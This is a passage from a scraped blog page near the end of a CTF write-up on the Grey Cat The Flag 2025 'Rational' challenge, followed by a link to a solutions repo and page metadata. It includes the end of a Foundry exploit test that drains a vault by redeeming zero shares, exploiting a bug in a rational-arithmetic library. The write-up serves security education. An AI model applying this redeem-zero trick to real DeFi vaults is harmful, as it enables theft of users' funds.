contract\n        vm.startPrank(attacker);\n        setupp.claim();\n\n        console.log(\"balance of attacker before redeeming\", setupp.vault().asset().balanceOf(attacker) / 1e18);\n        console.log(\"total supply of vault  before redeeming\", setupp.vault().totalSupply() / 1e18);\n\n        // setupp.vault().withdraw(0);\n        setupp.vault().redeem(0);\n\n        console.log(\n            \"balance of attacker after redeeming by the attacker\", setupp.vault().asset().balanceOf(attacker) / 1e18\n        );\n        console.log(\"total supply of vault  after minting by the attacker\", setupp.vault().totalSupply() / 1e18);\n\n        setupp.grey().approve(address(setupp.vault()), 1);\n\n        setupp.vault().mint(1);\n\n        console.log(\"balance of attacker after minting\", setupp.vault().asset().balanceOf(attacker) / 1e18);\n        console.log(\"total supply of vault  after redeeming\", setupp.vault().totalSupply() / 1e18);\n\n        setupp.vault().redeem(1);\n\n        console.log(\"balance of attacker after redeeming 2nd time\", setupp.vault().asset().balanceOf(attacker) / 1e18);\n        console.log(\"total supply of vault after redeeming 2nd time\", setupp.vault().totalSupply() / 1e18);\n\n        assertTrue(setupp.isSolved(), \"not solved\");\n    }\n}\n\n```\n## Solutions Repo\n\n[Grey Cat The Flag 2025 Solutions](https://github.com/BhaskarPeruri/Grey_Cat_The_Flag_2025_Solutions)\n\n\n## Conclusion\n\nThis challenge demonstrates how subtle bugs in custom mathematical libraries can lead to catastrophic failures in DeFi protocols. The vulnerability in the rational arithmetic library allowed complete bypass of the vault's accounting system, highlighting the importance of thorough testing of custom mathematical operations, especially edge cases involving zero values."])</script><script>self.__next_f.push([1,"7:[\"$\",\"div\",null,{\"className\":\"min-h-screen\",\"children\":[[\"$\",\"$L10\",null,{}],[\"$\",\"main\",null,{\"className\":\"pt-24 pb-16 px-4 sm:px-6 lg:px-8\",\"children\":[\"$\",\"$L11\",null,{\"blog\":{\"slug\":\"gas-optimization-techniques\",\"title\":\"Grey Cat The Flag 2025 Rational Challenge Writeup\",\"excerpt\":\"A detailed writeup of exploiting a subtle bug in a custom rational number library to drain a vault system in the Grey Cat The Flag 2025 CTF challenge.\",\"date\":\"2024-01-10\",\"readTime\":\"15 min read\",\"tags\":[\"CTF\",\"Smart Contract Security\",\"Solidity\",\"Vulnerability Analysis\"],\"image\":\"/greycattheflag.png\",\"content\":\"$12\"}}]}]]}]\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n"])</script><script>self.__next_f.push([1,"13:I[53960,[\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/db909c0d74f8c046.js\"],\"IconMark\"]\ne:[[\"$\",\"title\",\"0\",{\"children\":\"Satya Bhaskar Peruri\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Security researcher, auditor, and blockchain developer specializing in smart contract security and Web3 development\"}],[\"$\",\"meta\",\"2\",{\"name\":\"generator\",\"content\":\"Me\"}],[\"$\",\"link\",\"3\",{\"rel\":\"icon\",\"href\":\"/sun9.png\",\"media\":\"(prefers-color-scheme: light)\"}],[\"$\",\"link\",\"4\",{\"rel\":\"icon\",\"href\":\"/sun9.png\",\"media\":\"(prefers-color-scheme: dark)\"}],[\"$\",\"link\",\"5\",{\"rel\":\"icon\",\"href\":\"/sun9.png\",\"type\":\"image/svg+xml\"}],[\"$\",\"link\",\"6\",{\"rel\":\"apple-touch-icon\",\"href\":\"/sun9.png\"}],[\"$\",\"$L13\",\"7\",{}]]\na:null\n"])</script></body></html>